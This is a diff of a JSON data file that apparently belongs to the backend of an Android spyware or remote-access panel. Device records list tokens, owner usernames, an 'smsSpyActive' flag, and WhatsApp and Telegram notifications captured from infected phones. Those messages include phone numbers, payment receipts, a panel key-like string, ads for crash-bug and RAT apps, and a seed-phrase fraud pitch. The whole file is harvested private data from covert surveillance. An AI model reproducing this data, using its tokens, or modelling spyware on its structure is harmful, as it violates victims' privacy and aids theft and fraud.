@@ -6313,7 +6313,7 @@
     "deviceName": "HP-AUBREY-899E",
     "ownerUsername": "51a6566b-13c6-424c-8f68-421c28fdc099",
     "token": "3cfe8ffe8872f32822087d633ebd4fe4",
-    "lastSeen": 1776777289937,
+    "lastSeen": 1776777292964,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-21T09:49:26.839Z",
@@ -6329,6 +6329,14 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "WhatsApp",
+        "sender": "WhatsApp",
+        "content": "‎‎3519 pesan dari 22 chat",
+        "time": "21/04 20:14",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776777293986
+      },
       {
         "appName": "WhatsApp",
         "sender": "WhatsApp",
@@ -10320,14 +10328,6 @@
         "time": "21/04 19:41",
         "pkg": "com.whatsapp",
         "receivedAt": 1776775314363
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "WhatsApp",
-        "content": "‎‎3699 pesan dari 23 chat",
-        "time": "21/04 19:41",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1776775291857
       }
     ],
     "galleryPhotos": [],
@@ -10346,7 +10346,7 @@
     "deviceName": "HP-XIINZ-E979",
     "ownerUsername": "abiv12",
     "token": "42f963bfe947d35a7c960fecc604b095",
-    "lastSeen": 1776777290067,
+    "lastSeen": 1776777292662,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-21T09:50:02.203Z",
@@ -10403,6 +10403,62 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "Telegram",
+        "sender": "𝗖𝗼𝗻𝗳𝗲𝘀𝘀 𝗚𝗶𝗳𝘁 & 𝗢𝗿𝗱𝗲𝗿 𝗚𝗶𝗳𝘁",
+        "content": "🎉 User Baru Masuk!\n\n👤 @WizZzXTzy\n🆔 1887632665\n⏰ 21/4/2026, 13.09.28",
+        "time": "21/04 20:14",
+        "pkg": "org.telegram.messenger",
+        "receivedAt": 1776777293166
+      },
+      {
+        "appName": "Telegram",
+        "sender": "𝗞𝗮𝘁𝗶𝗹 𝗩𝗜𝗣 𝗣𝗿𝗲𝗱𝗶𝗰𝘁𝗶𝗼𝗻 📈",
+        "content": "Pol",
+        "time": "21/04 20:14",
+        "pkg": "org.telegram.messenger",
+        "receivedAt": 1776777293026
+      },
+      {
+        "appName": "Telegram",
+        "sender": "Fastcal haikk",
+        "content": "💳 NEW DEPOSIT RECEIVED!\n━━━━━━━━━━━━━━━\n👤 Sender: NOBU / MU*************\n🏦 Method: DANA\n💰 Amount: Rp 10.000\n💸 Fee: Rp 181\n💵 Total Payload: Rp 10.181\n━━━━━━━━━━━━━━━\n🏷️ Provider ID: RO20260421210731241799\n🏷️ System ID: FSCL68794690\n⏰ 21 Apr 2026 • 20:12 WIB\n\n#DEPOSIT #DANA",
+        "time": "21/04 20:14",
+        "pkg": "org.telegram.messenger",
+        "receivedAt": 1776777292898
+      },
+      {
+        "appName": "Telegram",
+        "sender": "ᴛᴇʟᴇᴋᴏꜱ ꜱᴛᴏʀᴇ",
+        "content": "🎉 PEMBELIAN NOMOR BERHASIL:\n————————————–––––——––•\n• Layanan Aplikasi: Whatsapp\n• Negara: Indonesia 🇮🇩\n• Server: Server (4)\n• Nomor: +6285*******99\n• Waktu: 21/04/2026, 20.13",
+        "time": "21/04 20:14",
+        "pkg": "org.telegram.messenger",
+        "receivedAt": 1776777292702
+      },
+      {
+        "appName": "Telegram",
+        "sender": "Phil Godlewski 4.0",
+        "content": "Community Zoom Sessions Continue! 📢\n\nOur community Zoom sessions with managers are continuing today\n\nWhether you want to:\n\n💬 Ask questions about the Atom Venture ecosystem\n📊 Learn more about what’s happening across our projects\n‼️ Get the latest updates, especially on Arteki\n💭 Join the conversation with the team \n\n– You have the chance to join throughout this entire week\n\n🗓 Today’s available session slots are:\n10 AM, 12 PM, 5 PM, 7 PM, 9 PM, and 11 PM Eastern time\n\n📍 Head to meet.boostyfi.com and book your slot\n\nSee you on Zoom  🙌",
+        "time": "21/04 20:14",
+        "pkg": "org.telegram.messenger",
+        "receivedAt": 1776777292686
+      },
+      {
+        "appName": "Telegram",
+        "sender": "SEWA WA BY LIFESTYLE😈: Rose",
+        "content": "Hey there just call me dimzz, and welcome to SEWA WA BY LIFESTYLE😈! How are you?",
+        "time": "21/04 20:14",
+        "pkg": "org.telegram.messenger",
+        "receivedAt": 1776777292578
+      },
+      {
+        "appName": "Telegram",
+        "sender": "GB PANEL PRIVATE WANZ: WantidCpanel_bot",
+        "content": "✅ pltc diupdate menjadi:\nptlc_xWflnyyNfpFo53neTxs0hr6UZwmpD8sUePhccYLUrNx",
+        "time": "21/04 20:14",
+        "pkg": "org.telegram.messenger",
+        "receivedAt": 1776777292526
+      },
       {
         "appName": "Telegram",
         "sender": "Telegram",
@@ -14346,62 +14402,6 @@
         "time": "21/04 19:34",
         "pkg": "org.telegram.messenger",
         "receivedAt": 1776774841532
-      },
-      {
-        "appName": "Telegram",
-        "sender": "𝐓𝐑𝐀𝐗𝐒𝐒𝐕𝐋𝐎𝐈𝐃 [ 𝐔𝐓𝐀𝐌𝐀 ]: Rose",
-        "content": "👾 NEW UPDATE TRAXSSVLOID V6 👾\n✎ Price/Harga:\n\n✓  Member:\n👾 1Bulan 10.000\n👾 Perma 25.000\n✓  Reseller:\n👾 1Bulan 35.000\n👾 Perma 45.000\n✓ Owner:\n👾 1Bulan 75.000\n👾 Perma 90.000\n✓ All akses\n👾 110.000\n\n⚙Fitur Bug:\n𝙺𝙸𝙻𝙻 𝙰𝙽𝙳𝚁𝙾\n𝙲𝚁𝙰𝚂𝙷 𝙷𝙸𝚃\n𝙲𝚁𝙰𝚂𝙷 𝙺𝙸𝙻𝙻\n𝙲𝚁𝙰𝚂𝙷 𝚄𝙸\n𝙳𝙴𝙻𝙰𝚈 𝙸𝙽𝚅𝙸𝚂𝙸𝙱𝙻𝙴\n𝙵𝚁𝙴𝙴𝚉𝙴 𝙱𝚄𝙶\n\n💬 Minat? Chat :\n@SHAKAAST\nChannel:\n@testishaka",
-        "time": "21/04 19:34",
-        "pkg": "org.telegram.messenger",
-        "receivedAt": 1776774841351
-      },
-      {
-        "appName": "Telegram",
-        "sender": "LearnTermuxHUB.Tools: 𝐃𝐈𝐓𝐙 𝐆𝐀𝐍𝐓𝐄𝐍𝐆",
-        "content": "APK BUG X RAT 5K PV @Napkxiua PERMANEN FULL UP",
-        "time": "21/04 19:34",
-        "pkg": "org.telegram.messenger",
-        "receivedAt": 1776774841080
-      },
-      {
-        "appName": "Telegram",
-        "sender": "ᴛᴇʟᴇᴋᴏꜱ ꜱᴛᴏʀᴇ",
-        "content": "🎉 PEMBELIAN NOMOR BERHASIL:\n————————————–––––——––•\n• Layanan Aplikasi: WhatsApp\n• Negara: Indonesia 🇮🇩\n• Server: Server (2)\n• Nomor: +62 8**********65\n• Waktu: 21/04/2026, 19.33",
-        "time": "21/04 19:34",
-        "pkg": "org.telegram.messenger",
-        "receivedAt": 1776774841030
-      },
-      {
-        "appName": "Telegram",
-        "sender": "Fastcal haikk",
-        "content": "💳 NEW DEPOSIT RECEIVED!\n━━━━━━━━━━━━━━━\n👤 Sender: NOBU / 6285117539840\n🏦 Method: SHOPEEPAY\n💰 Amount: Rp 5.000\n💸 Fee: Rp 170\n💵 Total Payload: Rp 5.170\n━━━━━━━━━━━━━━━\n🏷️ Provider ID: RO20260421203150241635\n🏷️ System ID: FSCL46897691\n⏰ 21 Apr 2026 • 19:33 WIB\n\n#DEPOSIT #SHOPEEPAY",
-        "time": "21/04 19:34",
-        "pkg": "org.telegram.messenger",
-        "receivedAt": 1776774840987
-      },
-      {
-        "appName": "Telegram",
-        "sender": "Telegram",
-        "content": "Davii・5880 pesan baru dari 48 obrolan",
-        "time": "21/04 19:34",
-        "pkg": "org.telegram.messenger",
-        "receivedAt": 1776774840823
-      },
-      {
-        "appName": "Telegram",
-        "sender": "GB PANEL PRIVATE WANZ: WantidCpanel_bot",
-        "content": "♻️ Restarting bot...",
-        "time": "21/04 19:33",
-        "pkg": "org.telegram.messenger",
-        "receivedAt": 1776774839731
-      },
-      {
-        "appName": "Telegram",
-        "sender": "ГРИНДЕР 💰",
-        "content": "🟢 Продолжаем абузить сидки\n\nПока одни думают, что тема уже отжила, другие спокойно продолжают делать круги и забирать профит. \n\nСхема не зависит от настроения, сезона или удачного дня. Есть мануал – есть результат ✅ Все остальное просто лишние мысли.\n\nПопробуй и убедись сам ➡️ https://telegra.ph/Zarabotok-na-pereprodazhe-Seed-fraz-Ot-1500-rublej-za-krug-03-09-5\n\n❓ Есть вопросы? Пиши сюда »ЛС«",
-        "time": "21/04 19:33",
-        "pkg": "org.telegram.messenger",
-        "receivedAt": 1776774839613
       }
     ],
     "galleryPhotos": [],
@@ -16688,7 +16688,7 @@
     "deviceName": "HP-VIP-DFF9",
     "ownerUsername": "kinzz",
     "token": "5d86b5519e1603f3456060c28a22c345",
-    "lastSeen": 1776777289895,
+    "lastSeen": 1776777292881,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-21T11:31:24.904Z",
